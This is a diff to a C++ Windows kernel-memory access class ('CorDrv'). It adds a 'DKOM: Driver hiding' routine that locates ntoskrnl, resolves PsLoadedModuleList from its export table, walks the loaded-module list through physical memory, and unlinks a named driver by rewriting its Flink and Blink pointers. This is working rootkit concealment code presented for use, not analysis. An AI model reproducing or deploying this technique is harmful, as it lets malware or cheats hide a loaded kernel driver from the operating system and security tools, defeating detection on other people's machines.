@@ -2,6 +2,8 @@
 #include <cstring>
 #include <cstdio>
 #include <cstdlib>
+#include <psapi.h>
+#pragma comment(lib, "psapi.lib")
 
 CorDrv::~CorDrv() { Close(); }
 
@@ -375,4 +377,140 @@ bool CorDrv::WriteProcessMemory(uint64_t DTB, uint64_t VirtualAddress, const voi
         src += chunk; va += chunk; remaining -= chunk;
     }
     return true;
+}
+
+// ---- DKOM: Driver hiding ----
+
+static uint32_t PeRvaToFileOffset(IMAGE_NT_HEADERS64* nt, uint32_t rva) {
+    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
+    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
+        if (rva >= sec->VirtualAddress && rva < sec->VirtualAddress + sec->Misc.VirtualSize)
+            return sec->PointerToRawData + (rva - sec->VirtualAddress);
+    }
+    return rva;
+}
+
+uint64_t CorDrv::GetNtoskrnlBase(char* OutName, size_t NameSize) {
+    LPVOID drivers[1024] = {};
+    DWORD cbNeeded = 0;
+    if (!EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) return 0;
+    DWORD count = cbNeeded / sizeof(LPVOID);
+    for (DWORD i = 0; i < count; i++) {
+        char name[MAX_PATH] = {};
+        if (!GetDeviceDriverBaseNameA(drivers[i], name, MAX_PATH)) continue;
+        if (_stricmp(name, "ntoskrnl.exe") == 0 || _stricmp(name, "ntkrnlmp.exe") == 0 ||
+            _stricmp(name, "ntkrnlpa.exe") == 0 || _stricmp(name, "ntkrpamp.exe") == 0) {
+            if (OutName && NameSize > 0) strncpy_s(OutName, NameSize, name, _TRUNCATE);
+            return reinterpret_cast<uint64_t>(drivers[i]);
+        }
+    }
+    return 0;
+}
+
+uint64_t CorDrv::ResolvePsLoadedModuleList(uint64_t NtBase, const char* NtName) {
+    char sysDir[MAX_PATH] = {};
+    GetSystemDirectoryA(sysDir, MAX_PATH);
+    char fullPath[MAX_PATH] = {};
+    snprintf(fullPath, MAX_PATH, "%s\\%s", sysDir, NtName);
+
+    HANDLE hFile = CreateFileA(fullPath, GENERIC_READ, FILE_SHARE_READ, nullptr,
+        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+    if (hFile == INVALID_HANDLE_VALUE) return 0;
+
+    DWORD fileSize = GetFileSize(hFile, nullptr);
+    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) { CloseHandle(hFile); return 0; }
+
+    uint8_t* data = new uint8_t[fileSize];
+    DWORD bytesRead = 0;
+    if (!ReadFile(hFile, data, fileSize, &bytesRead, nullptr) || bytesRead != fileSize) {
+        CloseHandle(hFile); delete[] data; return 0;
+    }
+    CloseHandle(hFile);
+
+    auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(data);
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { delete[] data; return 0; }
+    auto* nt = reinterpret_cast<IMAGE_NT_HEADERS64*>(data + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE) { delete[] data; return 0; }
+
+    auto& expDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+    if (!expDir.VirtualAddress || !expDir.Size) { delete[] data; return 0; }
+
+    auto* exp     = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(data + PeRvaToFileOffset(nt, expDir.VirtualAddress));
+    auto* names   = reinterpret_cast<uint32_t*>(data + PeRvaToFileOffset(nt, exp->AddressOfNames));
+    auto* ords    = reinterpret_cast<uint16_t*>(data + PeRvaToFileOffset(nt, exp->AddressOfNameOrdinals));
+    auto* funcs   = reinterpret_cast<uint32_t*>(data + PeRvaToFileOffset(nt, exp->AddressOfFunctions));
+
+    uint64_t result = 0;
+    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
+        const char* sym = reinterpret_cast<const char*>(data + PeRvaToFileOffset(nt, names[i]));
+        if (strcmp(sym, "PsLoadedModuleList") == 0) {
+            result = NtBase + funcs[ords[i]];
+            break;
+        }
+    }
+    delete[] data;
+    return result;
+}
+
+bool CorDrv::HideDriver(const wchar_t* DriverBaseName) {
+    if (m_SystemDTB == 0) return false;
+
+    char ntName[MAX_PATH] = {};
+    uint64_t ntBase = GetNtoskrnlBase(ntName, sizeof(ntName));
+    if (!ntBase) return false;
+
+    uint64_t listHeadVA = ResolvePsLoadedModuleList(ntBase, ntName);
+    if (!listHeadVA) return false;
+
+    uint64_t listHeadPhys = TranslateVirtualAddress(m_SystemDTB, listHeadVA);
+    if (!listHeadPhys) return false;
+
+    uint64_t currentEntryVA = 0;
+    if (!ReadPhysicalMemory(listHeadPhys, &currentEntryVA, sizeof(currentEntryVA))) return false;
+
+    for (uint32_t iterations = 0; currentEntryVA != listHeadVA && iterations < 512; iterations++) {
+        uint64_t entryPhys = TranslateVirtualAddress(m_SystemDTB, currentEntryVA);
+        if (!entryPhys) break;
+
+        uint16_t nameLen  = 0;
+        uint64_t nameBufVA = 0;
+        ReadPhysicalMemory(entryPhys + LdrEntry::BaseDllNameLength, &nameLen,  sizeof(nameLen));
+        ReadPhysicalMemory(entryPhys + LdrEntry::BaseDllNameBuffer, &nameBufVA, sizeof(nameBufVA));
+
+        bool found = false;
+        if (nameLen > 0 && nameLen <= 256 && nameBufVA != 0) {
+            wchar_t nameBuf[128] = {};
+            uint64_t nameBufPhys = TranslateVirtualAddress(m_SystemDTB, nameBufVA);
+            if (nameBufPhys) {
+                ReadPhysicalMemory(nameBufPhys, nameBuf, nameLen);
+                found = (_wcsicmp(nameBuf, DriverBaseName) == 0);
+            }
+        }
+
+        if (found) {
+            uint64_t entryFlink = 0, entryBlink = 0;
+            ReadPhysicalMemory(entryPhys + LdrEntry::InLoadOrderFlink, &entryFlink, sizeof(entryFlink));
+            ReadPhysicalMemory(entryPhys + LdrEntry::InLoadOrderBlink, &entryBlink, sizeof(entryBlink));
+            if (!entryFlink || !entryBlink) return false;
+
+            // prev->Flink = entry->Flink
+            uint64_t prevPhys = TranslateVirtualAddress(m_SystemDTB, entryBlink);
+            if (!prevPhys) return false;
+            WritePhysicalMemory(prevPhys + LdrEntry::InLoadOrderFlink, &entryFlink, sizeof(entryFlink));
+
+            // next->Blink = entry->Blink
+            uint64_t nextPhys = TranslateVirtualAddress(m_SystemDTB, entryFlink);
+            if (!nextPhys) return false;
+            WritePhysicalMemory(nextPhys + LdrEntry::InLoadOrderBlink, &entryBlink, sizeof(entryBlink));
+
+            return true;
+        }
+
+        // Advance to next entry via Flink
+        uint64_t nextFlink = 0;
+        ReadPhysicalMemory(entryPhys + LdrEntry::InLoadOrderFlink, &nextFlink, sizeof(nextFlink));
+        if (!nextFlink || nextFlink == currentEntryVA) break;
+        currentEntryVA = nextFlink;
+    }
+    return false;
 }
